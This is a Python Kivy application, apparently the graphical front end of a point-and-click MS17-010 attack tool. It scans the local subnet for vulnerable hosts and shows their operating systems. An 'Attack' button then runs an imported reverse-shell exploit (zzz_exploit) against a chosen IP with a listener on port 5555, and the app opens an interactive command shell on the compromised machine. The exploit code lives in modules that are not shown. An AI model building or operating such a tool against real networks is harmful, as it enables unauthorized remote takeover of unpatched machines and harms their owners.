from ms1710_scan_shell_command import MS1710SubnetScannerCommand
from ms1710_reverse_shell_command import MS1710ReverseShellCommand
from shell_control import ShellControl
from kivy.app import App
from widgets.scrollable_label import ScrollableLabel
from kivy.uix.textinput import TextInput
from kivy.uix.button import Button
from kivy.uix.gridlayout import GridLayout
from widgets.iplist import IPList
from kivy.logger import Logger
from zzz_exploit import exploit
from ip_utils import get_computer_ip
from kivy.core.window import Window


class ShellLayout(GridLayout):
    def __init__(self, **kwargs):
        self.command_output_label = ScrollableLabel(size_hint_x=1.0, size_hint_y=0.9)
        self.command_input = TextInput(hint_text='Write cmd here', size_hint_x=1.0, size_hint_y=0.1)
        # self.send_command_button = Button(size_hint_x=0.3, size_hint_y=0.1, text="S")
        self.command_input_grid = GridLayout(size_hint_x=1.0, size_hint_y=0.1, cols=2)
        self.command_input_grid.add_widget(self.command_input)
        # self.command_input_grid.add_widget(self.send_command_button)
        self.cb = None
        self.keyboard = Window.request_keyboard(self.__on_keyboard_close, self)
        self.keyboard.bind(on_key_down=self.__on_keyboard_down)
        # self.send_command_button.bind(on_press=self.on_command_button)

        kwargs['cols'] = 1
        kwargs['size_hint'] = (1.0, 1.0)
        super(ShellLayout, self).__init__(**kwargs)

        self.add_widget(self.command_output_label)
        self.add_widget(self.command_input_grid)

    def __on_keyboard_close(self):
        self.keyboard.unbind(on_key_down=self.__on_keyboard_down)
        self.keyboard = None

    def __on_keyboard_down(self, keyboard, keycode, text, modifiers):
        Logger.info(str(keycode))
        if keycode[1] == 'return':
            cmd = str(self.command_input.text)
            self.command_input.text = ''
            if self.cb:
                self.cb(cmd)

    def add_to_shell_text(self, text):
        self.command_output_label.text = self.command_output_label.text + text + '\n'

    def set_callback(self,  cb):
        self.cb = cb

    # def on_command_button(self, instance):
    #     if self.cb:
    #         cmd = str(self.command_input.text)
    #         self.command_input.text = ''
    #         self.cb(cmd)


class ScannerLayout(GridLayout):
    def __init__(self, **kwargs):
        self.shell_control = ShellControl()
        self.scanner_id = self.shell_control.add_shell_flow_command('MS1710Scanner', 'ms1710_scan', MS1710SubnetScannerCommand, True)
        self.revere_shell_id = self.shell_control.add_shell_flow_command('MS1710ReverseShell', 'ms1710_reverse_shell', MS1710ReverseShellCommand, True)
        self.shell_id = None
        self.shell_layout = ShellLayout(size_hint_x=1.0, size_hint_y=1.0)
        self.shell_layout.set_callback(self.on_command)

        self.shell_control.add_event_listener(self.scanner_id, 'scan_started', self.on_scan_started_event)
        self.shell_control.add_event_listener(self.scanner_id, 'scan_update', self.on_scan_update_event)
        self.shell_control.add_event_listener(self.scanner_id, 'scan_finished', self.on_scan_finished_event)
        self.shell_control.add_event_listener(self.revere_shell_id, 'exploit_success', self.on_exploit_ready)
        self.shell_control.add_event_listener(self.revere_shell_id, 'listener_data', self.on_listener_data)
        self.ip_list = IPList(size_hint_y=0.7)
        self.scan_button = Button(text="Scan", size_hint_y=0.15)
        self.scan_button.bind(on_press=self.on_scan_button_cb)
        self.attack_button = Button(text='Attack', size_hint_y=0.15)
        self.attack_button.bind(on_press=self.on_attack_button_cb)
        self.attack_button.disabled = True
        kwargs['cols'] = 1
        kwargs['size_hint'] = (1.0, 1.0)

        super(ScannerLayout, self).__init__(**kwargs)

        self.add_widget(self.scan_button)
        self.add_widget(self.attack_button)
        self.add_widget(self.ip_list)

    def on_command(self, command):
        Logger.info('COMMAND')
        Logger.info(command)
        self.shell_control.send_flow_event(self.shell_id, {'command': command})

    def on_listener_data(self, command_id, event, event_args):
        self.shell_layout.add_to_shell_text(event_args['data'])

    def on_attack_button_cb(self, instance):
        selected_ip = str(self.ip_list.list_adapter.selection[0].text).split('-')[0].strip()
        Logger.info('Selected IP to attack = ' + selected_ip)
        self.shell_id = self.shell_control.execute_shell_flow_commannd(self.revere_shell_id, {'target': selected_ip, 'listening_port': 5555})

    def on_exploit_ready(self, command_id, event, event_args):
        self.remove_widget(self.scan_button)
        self.remove_widget(self.attack_button)
        self.remove_widget(self.ip_list)
        self.add_widget(self.shell_layout)

    def on_scan_button_cb(self, instance):
        Logger.fatal("Starting the scanner")
        my_ip = get_computer_ip()
        if not my_ip:
            Logger.fatal('Cannot init scanner, failed to find IP, aborting')
            return
        self.shell_control.execute_shell_flow_commannd(self.scanner_id, {'subnet': my_ip, 'nthreads': 100})
        self.scan_button.disabled = True

    def on_scan_started_event(self, command_id, event, event_args):
        Logger.info('Scanner Start CB')

    def on_scan_finished_event(self, commmand_id, event, event_args):
        Logger.info('Scanner Finish CB')
        scanned_ips = event_args['ip_list']
        if len(scanned_ips) > 0:
            self.attack_button.disabled = False
        self.scan_button.disabled = False

    def on_scan_update_event(self, command_id, event, event_args):
        Logger.info('Scanner Update CB')
        scanned_ips = event_args['ip_list']
        self.ip_list.set_ips([t['ip'] + ' - ' + t['result_data']['os'] for t in scanned_ips])


class ScannerApp(App):
    def build(self):
        layout = ScannerLayout()
        return layout

